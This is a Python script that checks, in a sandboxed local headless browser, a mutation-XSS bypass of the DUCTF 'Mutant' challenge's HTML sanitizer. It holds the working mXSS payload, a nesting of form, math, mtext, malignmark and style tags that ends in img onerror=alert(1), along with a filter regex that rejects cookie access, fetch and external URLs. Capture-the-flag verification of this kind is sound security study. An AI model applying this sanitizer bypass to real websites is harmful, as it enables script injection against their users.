"""DUCTF Mutant: verify a harmless mutation-XSS proof in a local Chromium.

Runs the unmodified original main.js source and template in a temporary
file:// fixture. No CTF bot is contacted, no cookies are accessed and no
network exfiltration is possible. The positive sample executes only alert(1);
its effect is observed through a browser-side replacement of alert().
"""
import argparse
import re
import tempfile
from pathlib import Path
from urllib.parse import quote

# The original public writeup's inert local demonstration of mXSS.
MUTATION_SAMPLE = (
    "<form><math><mtext></form><form><malignmark><style>"
    "</math><img src onerror=alert(1)>"
)
NEGATIVE_SAMPLE = '<img src=1 onerror=alert(1)>'


def validate_source(source: str) -> None:
    required = (
        r't\.innerHTML\s*=\s*inp',
        r'n\.removeAttribute\(n\.attributes\[0\]\.name\)',
        r'n\.nodeName\.length\s*===\s*6',
        r'n\.nodeName\.length\s*===\s*8',
        r'myoutput\.innerHTML\s*=\s*t\.innerHTML',
    )
    if any(re.search(pattern, source) is None for pattern in required):
        raise ValueError("Original Mutant HTML sanitizer behavior changed")


def simulate_original(
    original_script: str,
    original_template: str,
    payload: str = MUTATION_SAMPLE,
) -> tuple[bool, str]:
    """Run the original filter in a local headless Chromium.

    Only non-networking marker payloads are supported. In particular,
    external URLs, fetch(), cookies and remote callbacks are rejected.
    """
    from playwright.sync_api import sync_playwright

    validate_source(original_script)
    if not (
        isinstance(payload, str)
        and len(payload) < 1024
        and not re.search(
            r"https?://|document\.cookie|fetch\s*\(|XMLHttpRequest|"
            r"import\s*\(|<script|javascript:|data:",
            payload, re.I,
        )
    ):
        raise ValueError("Only safe, local, non-exfiltrating markup is supported")

    script_ref = "{{ url_for('static', filename='main.js') }}"
    if script_ref not in original_template:
        raise ValueError("Original Jinja HTML script reference not found")

    with tempfile.TemporaryDirectory(prefix="ctf-mutant-local-") as tmp:
        root = Path(tmp)
        (root / "index.html").write_text(
            original_template.replace(script_ref, "main.js"),
            encoding="utf-8",
        )
        (root / "main.js").write_text(original_script, encoding="utf-8")
        url = (root / "index.html").as_uri() + "?input=" + quote(payload, safe="")
        with sync_playwright() as playwright:
            browser = playwright.chromium.launch(
                headless=True, args=["--no-sandbox"],
            )
            try:
                context = browser.new_context()
                context.route("http://**/*", lambda route: route.abort())
                context.route("https://**/*", lambda route: route.abort())
                context.add_init_script(
                    "window.__ctf_alert_count = 0;"
                    "window.alert = function(){window.__ctf_alert_count += 1;};"
                )
                page = context.new_page()
                page.goto(url, wait_until="load", timeout=15000)
                # Broken-image events fire asynchronously after parsing.
                page.wait_for_timeout(450)
                triggered = bool(page.evaluate("window.__ctf_alert_count > 0"))
                final_html = page.locator("#myoutput").inner_html()
                context.close()
                return triggered, final_html
            finally:
                browser.close()


def solve(script: str, template: str) -> bool:
    exploited, _ = simulate_original(script, template, MUTATION_SAMPLE)
    normal, _ = simulate_original(script, template, NEGATIVE_SAMPLE)
    if not exploited or normal:
        raise ValueError("Expected mutation XSS bypass and benign negative control")
    return True


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("original_js", type=Path)
    parser.add_argument("original_html", type=Path)
    args = parser.parse_args()
    if solve(args.original_js.read_text(encoding="utf-8"),
             args.original_html.read_text(encoding="utf-8")):
        print("Original browser sanitizer: local mutation-XSS alert marker executed")
        print("No cookie exfiltration or hosted CTF flag retrieval was attempted.")


if __name__ == "__main__":
    main()
